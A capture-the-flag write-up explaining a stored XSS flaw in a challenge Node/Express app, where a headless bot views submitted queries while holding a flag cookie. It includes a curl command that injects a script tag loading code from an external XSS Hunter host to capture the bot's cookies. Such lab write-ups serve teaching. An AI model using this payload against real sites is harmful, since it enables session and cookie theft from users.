#Forensics :: Baby APT

###Challenge Files: [web_toy_workshop.zip](web_toy_workshop.zip)

For this challenge, there is a docker component that hosts the vulnerable website, but you are provided with the challenge files to develop an exploit.

At first glance, we can see that this is a Node app running Express, there are two routes that are valid, **/api/submit** and **/queries**, however the query page only allows connections from localhost.

```js
router.post('/api/submit', async (req, res) => {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() => {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});
```

Looking at the submit function, it appears to accept a json object via a POST request with a "query" parameter, which is then enters into the database. Then is calls the function ```bot.readQueries()```. Next we can look at the other function:

So let's go ahead and see what the bot does:

```js 
const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) => {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};
```

We can see after some other initial setup, the bot stores a flag value in a cookie and then when the readQueries function is called, it browses to the queries page. Next let's go there:

```js 
router.get('/queries', async (req, res, next) => {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries => {
			res.render('queries', { queries });
		})
		.catch(() => res.status(500).send(response('Something went wrong!')));
});
```

When the bot visits the page, all of the queries that were submitted are displayed on the page. So this is a pretty simple stored XSS vulnerability where we can get the bot to view a script that will give us the flag in the cookie.

I personally used XSS Hunter which is just a nice simple way to capture XSS triggers without having to spin up your own listeners, etc. The payload was sent with Curl like:

```curl -X POST http://138.68.182.5:30527/api/submit -H 'Content-Type: application/json' -d '{"query":"<script src=https://myusername.xss.ht></script>"}'```

After a few minutes, the bot visits the page and on the XSSHunter dashboard I can see a report of the trigger including cookie values:

```HTB{3v1l_3lv3s_4r3_r1s1ng_up!}```